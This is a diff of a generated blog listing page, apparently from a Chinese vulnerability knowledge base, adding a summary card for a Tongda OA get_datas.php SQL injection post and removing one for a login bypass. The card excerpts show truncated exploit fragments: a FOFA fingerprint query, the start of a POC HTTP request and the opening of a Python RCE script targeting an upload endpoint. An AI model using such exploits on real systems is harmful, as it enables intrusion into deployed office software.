@@ -107,6 +107,12 @@
 <a href="/index.xml" title="RSS" target="_blank" rel="noopener noreffer me"><i class="fas fa-rss fa-fw" aria-hidden="true"></i></a>
 </div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">通达OA get_datas.php前台sql注入</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw%E6%BC%8F%E6%B4%9E/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw漏洞</a></span></div><div class="content">通达OA get_datas.php前台sql注入 fofa 1 app=&#34;TDXK-通达OA&#34; POC 1 2 3 4 5 6 7 POST /general/reportshop/utils/get_datas.php HTTP/1.1 Host: {{HostName}} Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 10.0;</div><div class="post-footer">
+        <a href="/%E9%80%9A%E8%BE%BEoa-get_datas.php%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw%E6%BC%8F%E6%B4%9E/">2023hw漏洞</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/%E9%80%9A%E8%BE%BEoa-ispiritinterfacegateway.php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABrce/">通达OA ispiritinterfacegateway.php文件包含rce</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div><div class="content">``` #!/usr/bin/env python3 -- encoding: utf-8 -- #https://mp.weixin.qq.com/s/K922zfgJpevXXBx1tWR8Ow &rsquo;&rsquo;&rsquo; @File : Tongda_rce.py @Time : 2020/03/19 12:00:00 @Author : Al1ex @Github : https://github.com/Al1ex &rsquo;'' import requests import re import sys def check(url): try: upload_url = url + '/ispirit/im/upload.php' flag=&quot;nt authority\system&quot;; headers = { &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot; } payload ='''------WebKitFormBoundaryBwVAwV3O4sifyhr3 Content-Disposition: form-data;</div><div class="post-footer">
@@ -135,12 +141,6 @@
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">通达OA v11.5 login_code.php 任意用户登录 漏洞描述 通达OA是一套办公系统。2020年04月17日, 通达OA官方在更新了一个v11版本安全补丁, 其中修复了一个任</div><div class="post-footer">
         <a href="/%E9%80%9A%E8%BE%BEoa-v11.5-login_code.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">通达OA v11.5 logincheck_code.php 登陆绕过漏洞</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2023-12-08">2023-12-08</time></span>&nbsp;<span class="post-category">included in <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>漏洞知识库</a></span></div><div class="content">通达OA v11.5 logincheck_code.php 登陆绕过漏洞 漏洞描述 通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台 漏洞影</div><div class="post-footer">
-        <a href="/%E9%80%9A%E8%BE%BEoa-v11.5-logincheck_code.php-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/">漏洞知识库</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
@@ -172,7 +172,7 @@
                     <span class="page-link" aria-hidden="true">&hellip;</span>
                 </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/198/">198</a>
+                        <a href="/page/333/">333</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
